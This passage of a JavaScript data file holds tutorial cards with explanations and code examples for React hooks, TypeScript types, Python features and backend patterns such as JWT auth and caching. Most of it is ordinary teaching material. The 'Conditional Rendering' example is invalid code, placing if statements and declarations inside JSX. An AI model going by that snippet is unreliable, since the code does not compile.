  const [user, setUser] = useState(null);

  // Fetch on mount and when userId changes
  useEffect(() => {
    let cancelled = false;
    fetchUser(userId).then(data => {
      if (!cancelled) setUser(data);
    });
    return () => { cancelled = true; }; // cleanup
  }, [userId]);

  // Subscribe to event
  useEffect(() => {
    const handler = (e) => console.log('Resize', e);
    window.addEventListener('resize', handler);
    return () => window.removeEventListener('resize', handler);
  }, []);

  // Timer
  useEffect(() => {
    const id = setInterval(() => setCount(c => c + 1), 1000);
    return () => clearInterval(id);
  }, []);

  if (!user) return <Spinner />;
  return <div>{user.name}</div>;
}`
  },
  {
    title: 'useContext',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Sharing data across the component tree without prop drilling.',
    content: 'useContext provides a way to pass data through the component tree without manually passing props at every level. Create a context with createContext, provide it with a Provider, consume it with useContext. Best for theme, auth, locale, and other global state. Don\'t overuse it — prop drilling is fine for 2-3 levels.',
    example: `import { createContext, useContext, useState } from 'react';

const ThemeContext = createContext();

function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('dark');
  const toggle = () => setTheme(t => t === 'dark' ? 'light' : 'dark');
  return (
    <ThemeContext.Provider value={{ theme, toggle }}>
      {children}
    </ThemeContext.Provider>
  );
}

function ThemedButton() {
  const { theme, toggle } = useContext(ThemeContext);
  return (
    <button onClick={toggle}>
      Current: {theme}
    </button>
  );
}

// Usage (wrap at top level)
<ThemeProvider>
  <App />
</ThemeProvider>`
  },
  {
    title: 'useRef',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Accessing DOM elements and persisting mutable values without re-renders.',
    content: 'useRef returns a mutable ref object (.current). Common uses: (1) Accessing DOM elements directly, (2) Storing values that don\'t trigger re-renders (previous values, timers, flags). Unlike useState, changing ref.current doesn\'t cause a re-render.',
    example: `import { useRef, useEffect } from 'react';

function TextInput() {
  const inputRef = useRef(null);

  const focus = () => inputRef.current.focus();

  return (
    <>
      <input ref={inputRef} type="text" />
      <button onClick={focus}>Focus</button>
    </>
  );
}

// Store previous value
function Counter() {
  const [count, setCount] = useState(0);
  const prevCount = useRef(count);

  useEffect(() => {
    prevCount.current = count;
  }, [count]);

  return <p>Now: {count}, Before: {prevCount.current}</p>;
}

// Store interval ID (no re-render)
function Timer() {
  const [time, setTime] = useState(0);
  const intervalRef = useRef(null);

  const start = () => {
    intervalRef.current = setInterval(() => setTime(t => t + 1), 1000);
  };
  const stop = () => clearInterval(intervalRef.current);
}`
  },
  {
    title: 'useMemo & useCallback',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Performance optimization — memoizing values and functions.',
    content: 'useMemo caches a computed value between re-renders (skip expensive recalculations). useCallback caches a function reference (prevent child re-renders). Both depend on dependency arrays. Don\'t premature-optimize — only use when you have measurable performance issues or pass callbacks to memoized children.',
    example: `import { useMemo, useCallback } from 'react';

function ProductList({ products, filter }) {
  // useMemo — skip expensive filtering
  const filtered = useMemo(() => {
    return products.filter(p => p.price > filter.min);
  }, [products, filter.min]);

  // useCallback — stable function reference
  const handleSelect = useCallback((id) => {
    console.log('Selected:', id);
  }, []);

  return (
    <ul>
      {filtered.map(p => (
        <Product key={p.id} product={p} onSelect={handleSelect} />
      ))}
    </ul>
  );
}

// React.memo + useCallback combo
const Product = React.memo(({ product, onSelect }) => {
  // Only re-renders if product or onSelect changes
  return <li onClick={() => onSelect(product.id)}>{product.name}</li>;
});`
  },
  {
    title: 'Custom Hooks',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Extracting reusable stateful logic into custom functions.',
    content: 'Custom hooks are functions that use other hooks. They let you extract component logic into reusable functions. Naming convention: use + descriptive name. They can return values, functions, or combinations. Same hook in different components maintains separate state.',
    example: `// Custom hook for API calls
function useFetch(url) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    setLoading(true);
    fetch(url)
      .then(res => res.json())
      .then(data => { setData(data); setLoading(false); })
      .catch(err => { setError(err); setLoading(false); });
  }, [url]);

  return { data, loading, error };
}

// Custom hook for localStorage
function useLocalStorage(key, initial) {
  const [value, setValue] = useState(() => {
    const saved = localStorage.getItem(key);
    return saved ? JSON.parse(saved) : initial;
  });

  useEffect(() => {
    localStorage.setItem(key, JSON.stringify(value));
  }, [key, value]);

  return [value, setValue];
}

// Usage
function App() {
  const { data, loading } = useFetch('/api/users');
  const [theme, setTheme] = useLocalStorage('theme', 'dark');
}`
  },
  {
    title: 'Lists & Keys',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Rendering collections efficiently with stable, unique keys.',
    content: 'Use map() to render arrays. Each element needs a unique key prop (prefer stable IDs over indices). Keys help React identify which items changed, were added, or removed. Bad keys cause rendering bugs and performance issues. Never use Math.random() as keys.',
    example: `function TodoList({ todos }) {
  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}>
          {todo.text}
        </li>
      ))}
    </ul>
  );
}

// ❌ Bad keys
{items.map((item, i) => <li key={i}>...</li>)}  // index
{items.map(item => <li key={Math.random()}>...</li>)}  // random

// ✅ Good keys
{items.map(item => <li key={item.id}>...</li>)}  // stable ID
{items.map(item => <li key={item.slug}>...</li>)}  // unique property

// Filtering without losing state
const [filter, setFilter] = useState('all');
const filtered = todos.filter(t =>
  filter === 'all' ? true : t.done === (filter === 'done')
);`
  },
  {
    title: 'Event Handling',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Handling user interactions with synthetic events.',
    content: 'React wraps native events in SyntheticEvents for cross-browser consistency. Event handlers are camelCase (onClick, onChange). Pass the handler, don\'t call it. Access the event object in the handler. Use event.preventDefault() for form submission. Event delegation happens automatically in React.',
    example: `function Form() {
  const handleSubmit = (e) => {
    e.preventDefault();  // prevent page reload
    const data = new FormData(e.target);
    console.log(data.get('email'));
  };

  const handleChange = (e) => {
    console.log(e.target.name, e.target.value);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input name="email" onChange={handleChange} />
      <input name="password" type="password" />
      <button type="submit">Submit</button>
    </form>
  );
}

// Event delegation
function List({ items }) {
  const handleClick = (e) => {
    // Single handler for all items
    const id = e.target.dataset.id;
    if (id) console.log('Clicked:', id);
  };

  return (
    <ul onClick={handleClick}>
      {items.map(i => <li key={i.id} data-id={i.id}>{i.name}</li>)}
    </ul>
  );
}`
  },
  {
    title: 'Conditional Rendering',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Showing/hiding UI elements based on state and props.',
    content: 'Multiple approaches: && operator (short-circuit), ternary operator (if/else), early return, if statements before return. Use the approach that reads most clearly. Avoid rendering null with && if the falsy value could be 0.',
    example: `function Dashboard({ user, notifications, isAdmin }) {
  // && operator
  return (
    <div>
      {user && <h1>Welcome, {user.name}</h1>}

      {/* Ternary */}
      {isAdmin ? <AdminPanel /> : <UserPanel />}

      {/* Avoid: && with 0 */}
      {notifications.length > 0 && <Badge count={notifications.length} />}

      {/* Early return for loading */}
      if (!user) return <Spinner />;

      {/* Variable assignment */}
      let content;
      if (isAdmin) content = <AdminView />;
      else if (user.premium) content = <PremiumView />;
      else content = <FreeView />;

      return <div>{content}</div>;
    </div>
  );
}`
  },
  {
    title: 'Forms in React',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Controlled vs uncontrolled components and form management.',
    content: 'Controlled components: React state is the single source of truth (value + onChange). Uncontrolled components: DOM holds the state (ref). Controlled gives full control, uncontrolled is simpler for quick forms. For complex forms, consider React Hook Form or Formik.',
    example: `// Controlled component
function ControlledForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    login(email, password);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      <input
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      <button type="submit">Login</button>
    </form>
  );
}

// Uncontrolled with ref
function UncontrolledForm() {
  const emailRef = useRef();

  const handleSubmit = () => {
    console.log(emailRef.current.value);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input ref={emailRef} type="email" defaultValue="" />
      <button type="submit">Login</button>
    </form>
  );
}`
  },
  {
    title: 'Error Boundaries',
    category: 'React',
    subcategory: 'Advanced',
    description: 'Catching JavaScript errors in the component tree gracefully.',
    content: 'Error boundaries are class components that catch errors in their child tree. They prevent the whole app from crashing. Use getDerivedStateFromError to update state, componentDidCatch for logging. Only class components can be error boundaries (no hook equivalent yet).',
    example: `class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }

  componentDidCatch(error, errorInfo) {
    logErrorToService(error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="error-fallback">
          <h2>Something went wrong</h2>
          <button onClick={() => this.setState({ hasError: false })}>
            Try again
          </button>
        </div>
      );
    }
    return this.props.children;
  }
}

// Usage
<ErrorBoundary>
  <Dashboard />
</ErrorBoundary>`
  },
  {
    title: 'React Patterns',
    category: 'React',
    subcategory: 'Advanced',
    description: 'Compound components, render props, HOCs, and container/presentational.',
    content: 'Common React patterns: Compound Components (Tabs, Accordion — implicit state sharing), Render Props (pass function as child), Higher-Order Components (withAuth, withTheme — wrap components), Container/Presentational (logic vs UI separation). Modern React favors custom hooks over HOCs and render props.',
    example: `// Compound Components
function Tabs({ children, defaultTab }) {
  const [active, setActive] = useState(defaultTab);
  return (
    <TabsContext.Provider value={{ active, setActive }}>
      {children}
    </TabsContext.Provider>
  );
}
Tabs.Panel = ({ label, children }) => {
  const { active, setActive } = useContext(TabsContext);
  return (
    <div>
      <button onClick={() => setActive(label)}>{label}</button>
      {active === label && children}
    </div>
  );
};

// Usage
<Tabs defaultTab="Home">
  <Tabs.Panel label="Home"><HomeContent /></Tabs.Panel>
  <Tabs.Panel label="Settings"><SettingsContent /></Tabs.Panel>
</Tabs>

// Custom hook pattern (modern replacement for HOCs)
function useAuth() {
  const { currentUser } = useContext(AuthContext);
  return currentUser;
}`
  },
  {
    title: 'Suspense & Lazy Loading',
    category: 'React',
    subcategory: 'Advanced',
    description: 'Code splitting and loading states with React Suspense.',
    content: 'React.lazy() dynamically imports a component (code splitting). Suspense shows a fallback while loading. Together they reduce initial bundle size. Error boundaries should wrap Suspense for error handling. Suspense also works with data fetching (React 18+).',
    example: `import { lazy, Suspense } from 'react';

// Lazy load heavy components
const Analytics = lazy(() => import('./pages/Analytics'));
const CodeLab = lazy(() => import('./pages/CodeLab'));

function App() {
  return (
    <Suspense fallback={<LoadingSpinner />}>
      <Routes>
        <Route path="/analytics" element={<Analytics />} />
        <Route path="/codelab" element={<CodeLab />} />
      </Routes>
    </Suspense>
  );
}

// With error boundary
<ErrorBoundary>
  <Suspense fallback={<Spinner />}>
    <HeavyComponent />
  </Suspense>
</ErrorBoundary>

// Named exports with lazy
const Dashboard = lazy(() =>
  import('./Dashboard').then(mod => ({ default: mod.Dashboard }))
);`
  },
  {
    title: 'React Hooks Rules',
    category: 'React',
    subcategory: 'Best Practices',
    description: 'Rules that must be followed for hooks to work correctly.',
    content: 'Two rules: (1) Only call hooks at the top level — never inside loops, conditions, or nested functions. (2) Only call hooks from React functions — components or custom hooks. These rules exist because hooks rely on call order to match state to hooks. The eslint-plugin-react-hooks enforces these.',
    example: `// ❌ WRONG — conditional hook
function Component({ show }) {
  if (show) {
    const [value, setValue] = useState('');  // ERROR!
  }
}

// ✅ RIGHT — always call hooks
function Component({ show }) {
  const [value, setValue] = useState('');
  // Use the value conditionally in JSX
  return show && <input value={value} />;
}

// ❌ WRONG — hook in callback
function Component() {
  useEffect(() => {
    const [local, setLocal] = useState(0);  // ERROR!
  }, []);
}

// ✅ RIGHT — custom hook
function useLocalStorage(key) {
  const [value, setValue] = useState(() =>
    JSON.parse(localStorage.getItem(key))
  );
  return [value, setValue];
}

// ESLint plugin enforces rules
// npm install eslint-plugin-react-hooks`
  },

  // ═══════════════════════════════════════════
  // TYPESCRIPT — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'Type System',
    category: 'TypeScript',
    subcategory: 'Fundamentals',
    description: 'Static typing that catches errors at compile time, not runtime.',
    content: 'TypeScript adds a structural type system on top of JavaScript. Every variable, parameter, and return value can have a type. Types are checked at compile time and erased at runtime — no performance cost. TypeScript infers types automatically (type inference) but you can annotate explicitly. Key types: string, number, boolean, null, undefined, any, unknown, void, never, tuple, enum, union, intersection.',
    example: `// Explicit annotations
let name: string = "Alice";
let age: number = 25;
let active: boolean = true;

// Type inference
let city = "NYC"; // inferred as string

// Union types
let id: string | number = "abc";
id = 123; // also valid

// Function typing
function add(a: number, b: number): number {
  return a + b;
}`
  },
  {
    title: 'Interfaces vs Types',
    category: 'TypeScript',
    subcategory: 'Fundamentals',
    description: 'Two ways to define object shapes — interfaces extend, types compose.',
    content: 'Interfaces and types both define object shapes but differ in capabilities. Interfaces support declaration merging, extend other interfaces, and are ideal for object contracts and class implementations. Types support unions, intersections, mapped types, and conditional types — more flexible for complex type manipulation. Use interfaces for public APIs and object shapes; use types for unions, primitives, and computed types.',
    example: `// Interface — extensible, declaration merging
interface User {
  name: string;
  age: number;
}
interface Admin extends User {
  role: string;
}

// Type — more flexible
type Point = { x: number; y: number };
type ID = string | number; // union
type Named = User & { email: string }; // intersection

// Declaration merging (only interfaces)
interface Config {
  debug: boolean;
}
interface Config {
  verbose: boolean;
}
// Config now has both debug and verbose`
  },
  {
    title: 'Generics',
    category: 'TypeScript',
    subcategory: 'Fundamentals',
    description: 'Type parameters that make components reusable across multiple types.',
    content: 'Generics allow you to write code that works with any type while preserving type safety. Instead of using "any", you define a type parameter (<T>) that gets resolved when the function is called. Generics are used in functions, interfaces, classes, and type aliases. Constraints (extends) limit which types can be passed. Default types provide fallback values.',
    example: `// Generic function
function identity<T>(value: T): T {
  return value;
}
identity<string>("hello"); // explicitly "hello"
identity(42);               // inferred as number

// Generic interface
interface ApiResponse<T> {
  data: T;
  status: number;
}

// Constrained generic
function getProperty<T, K extends keyof T>(obj: T, key: K) {
  return obj[key];
}
const user = { name: "Alice", age: 25 };
getProperty(user, "name"); // valid
// getProperty(user, "email"); // error!`
  },
  {
    title: 'Utility Types',
    category: 'TypeScript',
    subcategory: 'Fundamentals',
    description: 'Built-in type transformations for common patterns.',
    content: 'TypeScript provides utility types that transform existing types. Partial<T> makes all properties optional. Required<T> makes all properties required. Pick<T, K> selects specific keys. Omit<T, K> removes specific keys. Record<K, V> creates typed objects. Readonly<T> prevents mutation. ReturnType<T> extracts function return types. Parameters<T> extracts parameter types.',
    example: `interface User {
  name: string;
  age: number;
  email: string;
}

// Partial — all optional
type UpdateUser = Partial<User>;

// Pick — select keys
type UserName = Pick<User, "name">;

// Omit — remove keys
type UserWithoutEmail = Omit<User, "email">;

// Record — typed object
type Roles = Record<string, string[]>;

// Readonly — immutable
const user: Readonly<User> = { name: "A", age: 25, email: "a@b.com" };
// user.name = "B"; // error!`
  },
  {
    title: 'Decorators',
    category: 'TypeScript',
    subcategory: 'Advanced',
    description: 'Functions that modify classes, methods, properties, or parameters at declaration time.',
    content: 'Decorators are special declarations that can be attached to class declarations, methods, properties, or parameters. They execute when the class is defined, not instantiated. Enable experimentalDecorators in tsconfig. Use cases: logging, memoization, validation, dependency injection, and AOP (aspect-oriented programming). Class decorators receive the constructor. Method decorators receive prototype, key, and descriptor.',
    example: `// Method decorator — logging
function Log(target: any, key: string, descriptor: PropertyDescriptor) {
  const original = descriptor.value;
  descriptor.value = function (...args: any[]) {
    console.log(\`Calling \${key} with\`, args);
    return original.apply(this, args);
  };
}

class Calculator {
  @Log
  add(a: number, b: number) {
    return a + b;
  }
}

new Calculator().add(2, 3);
// logs: Calling add with [2, 3]`
  },
  {
    title: 'Type Narrowing',
    category: 'TypeScript',
    subcategory: 'Advanced',
    description: 'Refining broad types to more specific ones through control flow analysis.',
    content: 'TypeScript automatically narrows types within conditionals, type guards, and assertions. You can narrow using typeof, instanceof, in operator, custom type guards (x is Type), and discriminated unions (switch on a common literal property). Narrowing lets you safely access properties that only exist on specific types.',
    example: `// Discriminated union
type Shape =
  | { kind: "circle"; radius: number }
  | { kind: "rectangle"; width: number; height: number };

function area(shape: Shape): number {
  switch (shape.kind) {
    case "circle":
      return Math.PI * shape.radius ** 2; // narrowed
    case "rectangle":
      return shape.width * shape.height;   // narrowed
  }
}

// typeof narrowing
function format(value: string | number) {
  if (typeof value === "string") {
    return value.toUpperCase(); // narrowed to string
  }
  return value.toFixed(2);      // narrowed to number
}`
  },
  {
    title: 'Mapped Types',
    category: 'TypeScript',
    subcategory: 'Advanced',
    description: 'Creating new types by transforming each property of an existing type.',
    content: 'Mapped types iterate over keys of an existing type to produce a new type. Syntax: { [K in keyof T]: NewType }. Combined with modifiers, you can add/remove readonly and optional. Template literal types enable string manipulation. Mapped types power most utility types and enable powerful type-level programming.',
    example: `// Basic mapped type
type Optional<T> = {
  [K in keyof T]?: T[K];
};

// Make all properties readonly
type Immutable<T> = {
  readonly [K in keyof T]: T[K];
};

// Remove nullability
type NonNullable<T> = {
  [K in keyof T]: Exclude<T[K], null>;
};

interface User { name: string; age: number; }
type OptionalUser = Optional<User>;
// { name?: string; age?: number; }

// With template literals
type Getters<T> = {
  [K in keyof T as \`get\${Capitalize<string & K>}\`]: () => T[K];
};`
  },
  {
    title: 'Declaration Files',
    category: 'TypeScript',
    subcategory: 'Advanced',
    description: '.d.ts files that provide type information for JavaScript libraries.',
    content: 'Declaration files (.d.ts) describe the shape of JavaScript modules that lack TypeScript types. They use "declare" to describe runtime values without implementing them. DefinitelyTyped (@types/*) is the community repository for type definitions. You can generate .d.ts from your own code with "declaration: true" in tsconfig. Module augmentation extends existing type definitions.',
    example: `// my-library.d.ts
declare module "my-library" {
  export function doSomething(input: string): number;
  export interface Config {
    debug: boolean;
    timeout?: number;
  }
}

// Ambient declarations
declare const API_URL: string;
declare function fetchJSON<T>(url: string): Promise<T>;

// Module augmentation
declare module "express" {
  interface Request {
    user?: { id: string; role: string };
  }
}`
  },

  // ═══════════════════════════════════════════
  // PYTHON — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'Variables & Types',
    category: 'Python',
    subcategory: 'Fundamentals',
    description: 'Dynamic typing with built-in types and type hinting.',
    content: 'Python is dynamically typed — no type declarations needed. Variables are names bound to objects. Built-in types: int, float, str, bool, list, tuple, dict, set, None. Type hints (PEP 484) add optional annotations for documentation and tooling. Python uses duck typing — if it quacks like a duck, it\'s a duck. Multiple assignment and tuple unpacking are idiomatic.',
    example: `# Multiple assignment
x, y, z = 1, 2.5, "hello"
a = b = c = 0

# Type hints (not enforced at runtime)
name: str = "Alice"
age: int = 25
scores: list[float] = [95.5, 87.3]

# Tuple unpacking
point = (3, 4)
px, py = point

# Walrus operator (Python 3.8+)
if (n := len([1, 2, 3])) > 2:
    print(f"Length is {n}")`
  },
  {
    title: 'List Comprehensions',
    category: 'Python',
    subcategory: 'Fundamentals',
    description: 'Concise syntax for creating lists from iterables with optional filtering.',
    content: 'List comprehensions replace for-loops for list creation. Syntax: [expr for item in iterable if condition]. They\'re faster than equivalent for-loops because the iteration is optimized in C. You can nest comprehensions and use them for dicts ({k:v}) and sets. Keep them simple — if they\'re complex, use a regular loop.',
    example: `# Basic
squares = [x**2 for x in range(10)]

# With condition
evens = [x for x in range(20) if x % 2 == 0]

# Nested
matrix = [[i*j for j in range(3)] for i in range(3)]

# Dict comprehension
word_lengths = {w: len(w) for w in ["hello", "world"]}

# Set comprehension
unique_chars = {c for c in "mississippi"}

# Generator expression (memory efficient)
total = sum(x**2 for x in range(1000000))`
  },
  {
    title: 'Decorators',
    category: 'Python',
    subcategory: 'Fundamentals',
    description: 'Functions that modify other functions or classes — a form of metaprogramming.',
    content: 'A decorator is a function that takes a function and returns a modified version. The @decorator syntax is syntactic sugar for func = decorator(func). Decorators are used for logging, authentication, caching, rate limiting, and more. They can take arguments using nested functions. Class decorators modify classes. functools.wraps preserves the original function\'s metadata.',
    example: `import functools
import time

def timer(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        start = time.time()
        result = func(*args, **kwargs)
        print(f"{func.__name__} took {time.time()-start:.4f}s")
        return result
    return wrapper

@timer
def slow_function():
    time.sleep(1)
    return "done"

# Decorator with arguments
def retry(max_attempts=3):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_attempts - 1:
                        raise
        return wrapper
    return decorator`
  },
  {
    title: 'Generators',
    category: 'Python',
    subcategory: 'Fundamentals',
    description: 'Functions that yield values lazily, producing one at a time.',
    content: 'Generators use "yield" instead of "return" — they pause execution and resume on next call. They\'re memory efficient for large datasets since they produce values on-demand. Generator expressions (x**2 for x in range(1000000)) are lazy lists. send() and yield from provide advanced control flow. Generators implement the iterator protocol (__iter__, __next__).',
    example: `# Generator function
def fibonacci():
    a, b = 0, 1
    while True:
        yield a
        a, b = b, a + b

fib = fibonacci()
print(next(fib))  # 0
print(next(fib))  # 1
print(next(fib))  # 1

# Yield from — delegating to sub-generator
def flatten(nested):
    for item in nested:
        if isinstance(item, list):
            yield from flatten(item)
        else:
            yield item

list(flatten([1, [2, 3], [4, [5]]]))  # [1,2,3,4,5]

# Generator expression
total = sum(x**2 for x in range(1000000))`
  },
  {
    title: 'Context Managers',
    category: 'Python',
    subcategory: 'Fundamentals',
    description: 'Objects that manage resource allocation and cleanup with the "with" statement.',
    content: 'Context managers ensure proper resource handling (files, connections, locks) by pairing setup and teardown. The "with" statement calls __enter__ on entry and __exit__ on exit, even if exceptions occur. Implement via class (__enter__/__exit__) or @contextmanager decorator. They prevent resource leaks and reduce boilerplate try/finally blocks.',
    example: `from contextlib import contextmanager

# File context manager
with open("data.txt", "r") as f:
    content = f.read()
# File automatically closed

# Custom context manager with decorator
@contextmanager
def database_connection(url):
    conn = connect(url)
    try:
        yield conn
    finally:
        conn.close()

with database_connection("postgres://...") as db:
    db.execute("SELECT 1")

# Suppress exceptions
from contextlib import suppress
with suppress(FileNotFoundError):
    os.remove("maybe_exists.txt")`
  },
  {
    title: 'Object-Oriented Programming',
    category: 'Python',
    subcategory: 'Fundamentals',
    description: 'Classes, inheritance, and Python\'s data model.',
    content: 'Python supports multiple inheritance, method resolution order (MRO), and dunder methods for operator overloading. Classes are first-class objects. Use @property for getters/setters, @classmethod for alternative constructors, @staticmethod for utility methods. Dataclasses (@dataclass) auto-generate __init__, __repr__, __eq__, etc. Python uses "composition over inheritance" as a guiding principle.',
    example: `from dataclasses import dataclass

@dataclass
class Point:
    x: float
    y: float

    def distance(self, other: "Point") -> float:
        return ((self.x - other.x)**2 + (self.y - other.y)**2)**0.5

class Animal:
    def __init__(self, name: str):
        self.name = name

    def speak(self) -> str:
        raise NotImplementedError

class Dog(Animal):
    def speak(self) -> str:
        return f"{self.name} says Woof!"

# Property decorator
class Circle:
    def __init__(self, radius: float):
        self._radius = radius

    @property
    def area(self) -> float:
        return 3.14159 * self._radius ** 2`
  },
  {
    title: 'Type Hints',
    category: 'Python',
    subcategory: 'Advanced',
    description: 'Optional annotations for static type checking and better IDE support.',
    content: 'Type hints (PEP 484) add type information without runtime enforcement. They improve code documentation, enable static analysis with mypy/pyright, and provide better IDE autocompletion. Use typing module for complex types: List, Dict, Optional, Union, Callable, TypeVar, Generic, Protocol, Literal, Annotated. Type hints are optional but increasingly standard in production Python.',
    example: `from typing import Optional, Union, Callable, TypeVar, Generic

T = TypeVar("T")

# Basic hints
def greet(name: str) -> str:
    return f"Hello, {name}"

# Optional and Union
def find_user(id: int) -> Optional[dict]:
    return None  # could be dict or None

# Generic class
class Stack(Generic[T]):
    def __init__(self) -> None:
        self._items: list[T] = []

    def push(self, item: T) -> None:
        self._items.append(item)

    def pop(self) -> T:
        return self._items.pop()

# Protocol (structural subtyping)
from typing import Protocol

class Drawable(Protocol):
    def draw(self) -> None: ...`
  },
  {
    title: 'Async Programming',
    category: 'Python',
    subcategory: 'Advanced',
    description: 'Cooperative concurrency using asyncio for I/O-bound tasks.',
    content: 'Python\'s asyncio provides single-threaded concurrency using an event loop. async/await syntax makes asynchronous code readable. Use for I/O-bound tasks (network, files, databases), not CPU-bound work. asyncio.gather() runs multiple coroutines concurrently. aiohttp, asyncpg, aioredis provide async libraries. asyncio.Semaphore controls concurrency limits.',
    example: `import asyncio
import aiohttp

async def fetch(session, url):
    async with session.get(url) as response:
        return await response.text()

async def main():
    urls = ["https://api.example.com/1", "https://api.example.com/2"]

    async with aiohttp.ClientSession() as session:
        # Run concurrently
        tasks = [fetch(session, url) for url in urls]
        results = await asyncio.gather(*tasks)

    for result in results:
        print(result)

# Semaphore for rate limiting
sem = asyncio.Semaphore(10)

async def limited_fetch(session, url):
    async with sem:
        return await fetch(session, url)

asyncio.run(main())`
  },

  // ═══════════════════════════════════════════
  // BACKEND — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'REST API Design',
    category: 'Backend',
    subcategory: 'Fundamentals',
    description: 'Architectural constraints for building scalable web services.',
    content: 'REST (Representational State Transfer) uses HTTP methods semantically: GET (read), POST (create), PUT (full update), PATCH (partial update), DELETE (remove). Resources are nouns at plural URLs (/users, /users/123). Use HTTP status codes correctly: 200 (OK), 201 (Created), 204 (No Content), 400 (Bad Request), 401 (Unauthorized), 404 (Not Found), 500 (Server Error). Stateless — each request contains all needed info.',
    example: `// Resource-oriented URLs
GET    /api/v1/users          # List users
POST   /api/v1/users          # Create user
GET    /api/v1/users/:id      # Get user
PATCH  /api/v1/users/:id      # Update user
DELETE /api/v1/users/:id      # Delete user

// Status codes
200 OK — successful GET
201 Created — successful POST
400 Bad Request — validation error
401 Unauthorized — missing/invalid token
404 Not Found — resource doesn't exist

// Pagination
GET /api/v1/users?page=2&limit=20

// Filtering
GET /api/v1/users?role=admin&status=active`
  },
  {
    title: 'JWT Authentication',
    category: 'Backend',
    subcategory: 'Fundamentals',
    description: 'JSON Web Tokens for stateless API authentication.',
    content: 'JWT (JSON Web Tokens) encode user claims in a signed token. Three parts: header (algorithm), payload (claims), signature (verification). Server validates tokens without database lookup — making auth stateless. Store in httpOnly cookies (not localStorage). Tokens have expiration (exp claim). Use refresh tokens for long-lived sessions. Never store sensitive data in the payload (it\'s base64, not encrypted).',
    example: `// JWT structure: header.payload.signature

// Creating a token (server-side)
const jwt = require("jsonwebtoken");

const token = jwt.sign(
  { userId: 123, role: "admin" },
  process.env.JWT_SECRET,
  { expiresIn: "1h" }
);

// Verifying (middleware)
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "No token" });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch {
    res.status(401).json({ error: "Invalid token" });
  }
}`
  },
  {
    title: 'Middleware Pattern',
    category: 'Backend',
    subcategory: 'Fundamentals',
    description: 'Functions that process requests in a pipeline before reaching the handler.',
    content: 'Middleware functions execute sequentially in a chain. Each middleware can modify the request/response, end the cycle, or pass control to the next middleware. Used for logging, authentication, CORS, body parsing, validation, error handling. Express, Fastify, and Koa all use this pattern. Middleware order matters — auth before route handlers, logging first.',
    example: `// Express middleware pipeline
const express = require("express");
const app = express();

// 1. Logging (first)
app.use((req, res, next) => {
  console.log(\`\${req.method} \${req.path}\`);
  next();
});

// 2. Auth middleware
function auth(req, res, next) {
  const token = req.headers.authorization;
  if (!token) return res.status(401).send("Unauthorized");
  req.user = verifyToken(token);
  next();
}

// 3. Route with auth
app.get("/profile", auth, (req, res) => {
  res.json(req.user);
});

// Error handler (last)
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message });
});`
  },
  {
    title: 'Database Connection Pooling',
    category: 'Backend',
    subcategory: 'Fundamentals',
    description: 'Reusing database connections to avoid overhead of constant connection creation.',
    content: 'Creating a new database connection for each request is expensive (TCP handshake, auth). Connection pooling maintains a pool of open connections that are reused. Configured with min/max connections, idle timeout, and connection lifetime. Libraries: pg-pool (PostgreSQL), mysql2 pools, Prisma, SQLAlchemy. Monitor pool usage — exhaustion causes request queuing and timeouts.',
    example: `// PostgreSQL connection pool
const { Pool } = require("pg");

const pool = new Pool({
  host: "localhost",
  port: 5432,
  database: "myapp",
  user: "admin",
  password: "secret",
  max: 20,           // max connections
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000,
});

// Use pool
async function query(text, params) {
  const client = await pool.connect();
  try {
    const result = await client.query(text, params);
    return result.rows;
  } finally {
    client.release(); // return to pool
  }
}

// Cleanup on shutdown
process.on("SIGTERM", () => pool.end());`
  },
  {
    title: 'Caching Strategies',
    category: 'Backend',
    subcategory: 'Architecture',
    description: 'Storing frequently accessed data closer to the application.',
    content: 'Caching reduces database load and response times. Strategies: Cache-aside (app checks cache first, then DB), Write-through (write to cache+DB simultaneously), Write-behind (write to cache, async to DB), Read-through (cache loads from DB on miss). Invalidation is the hardest problem — use TTL (time-to-live), event-based invalidation, or versioned keys. Redis is the most common cache store.',
    example: `// Cache-aside pattern
async function getUser(id) {
  // 1. Check cache
  const cached = await redis.get(\`user:\${id}\`);
  if (cached) return JSON.parse(cached);

  // 2. Cache miss — fetch from DB
  const user = await db.query("SELECT * FROM users WHERE id = $1", [id]);
  if (!user) return null;

  // 3. Populate cache with TTL
  await redis.setex(\`user:\${id}\`, 3600, JSON.stringify(user));
  return user;
}

// Cache invalidation on write
async function updateUser(id, data) {
  await db.query("UPDATE users SET ... WHERE id = $1", [id]);
  await redis.del(\`user:\${id}\`); // invalidate
}`
  },
  {
    title: 'Message Queues',
    category: 'Backend',
    subcategory: 'Architecture',
    description: 'Asynchronous communication between services via pub/sub or task queues.',
